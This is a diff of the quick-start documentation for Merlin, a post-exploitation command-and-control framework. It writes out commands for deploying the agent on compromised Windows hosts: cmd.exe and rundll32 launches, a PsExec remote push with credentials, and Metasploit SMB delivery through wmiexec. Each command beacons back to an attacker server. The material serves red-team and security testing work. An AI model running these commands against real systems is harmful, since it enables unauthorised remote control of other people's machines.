@@ -1,8 +1,31 @@
+###########
+Quick Start
+###########
+
+.. _server_quickstart:
+
+*************
+Merlin Server
+*************
+
+The quickest and recommended way is to download Merlin Server from the `releases <https://github.com/Ne0nd0g/merlin/releases>`_
+page for your host operating system (i.e Windows, macOS, or Linux).
+
+The following single line of code can be used to download, extract, and run Merlin Server on an Ubuntu Server:
+
+.. code-block:: bash
+
+ sudo bash;apt update;apt install p7zip-full -y;cd /opt;wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z;7z x -pmerlin -omerlin merlinServer-Linux-x64.7z;cd merlin;./merlinServer-Linux-x64
+
+If you're using 7zip from the command line, but sure to use the ``x`` flag so that the files are extracted into their respective directories.
+
+**The Merlin Server file download includes the CLI and compiled agents for all 3 major platforms in the** ``data/bin/`` **directory**
+
 .. _agent_quickstart:
 
-============
+************
 Merlin Agent
-============
+************
 
 Merlin is a post-exploitation framework and therefore documentation doesn't cover any of the steps required to get to a
 point where you can execute code or commands on a compromised host. Exploiting or accessing a host must performed prior
@@ -16,22 +39,20 @@ Retrieve with Go and build the Agent::
 
     go get github.com/Ne0nd0g/merlin-agent
 
-----------------
 Upload & Execute
-----------------
+================
 
 One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.
 
 | Don't forget to specify the address of your Merlin server with the ``-url`` flag. Default is `https://127.0.0.1:443/`
 
--------------------------------
 Windows Local Command Execution
--------------------------------
+===============================
 
 This section covers executing the Merlin agent with local command execution.
 
 Windows EXE - cmd.exe
-^^^^^^^^^^^^^^^^^^^^^
+---------------------
 
 With the `merlinAgent.exe` binary file already downloaded on to the compromised host, execute it by calling it from the
 command line. Double clicking the executable file will cause the agent to run **without** a window, so you will not see
@@ -43,7 +64,7 @@ cmd.exe example::
     C:\Users\Bob\Downloads>merlinAgent.exe -url https://192.168.1.100:443/
 
 Windows DLL - rundll32.exe
-^^^^^^^^^^^^^^^^^^^^^^^^^^
+--------------------------
 
 With the `merlin.dll` binary file already downloaded on to the compromised host, execute it by calling it from the
 command line using the `rundll32.exe` program that comes with Windows.
@@ -54,14 +75,13 @@ rundll32.exe example::
 
     C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/
 
---------------------------------
 Windows Remote Command Execution
---------------------------------
+================================
 
 This section covers executing Merlin agent when remotely accessing a host.
 
 Windows EXE - PsExec.exe
-^^^^^^^^^^^^^^^^^^^^^^^^
+-------------------------
 
 The Microsoft Sysinternals `PsExec.exe <https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>`_ application
 can be used to connect to a remote host, upload the Merlin agent file, and execute it.
@@ -75,7 +95,7 @@ PsExec.exe example::
     PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/
 
 Windows DLL - Metasploit's SMB Delivery
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+---------------------------------------
 
 One method for delivery is to use an SMB server to host the payload and execute a command on the remote host to download
 and run the Merlin agent file. The Metasploit `windows/smb/smb_delivery` module is a good way to quickly stand up an SMB
@@ -112,7 +132,7 @@ wmiexec.py example:
 
 | **NOTE:** We must change the DLL entry point from `0` to `Run` and provide the URL of the listening Merlin server
 
-::
+.. code-block:: text
 
     root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.10
     Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
@@ -123,7 +143,7 @@ wmiexec.py example:
     C:\>rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/
 
 Advanced
---------
+========
 
 The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the
 listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify,
@@ -135,7 +155,7 @@ during execution.
 | This will require that you have Go and gcc installed on the host compiling the application
 
 Recompile DLL
-^^^^^^^^^^^^^
+-------------
 
 The `merlin.dll` file can be configured with the hardcoded url of your Merlin server.
 To do this, clone the repo, modify the file, and recompile it.
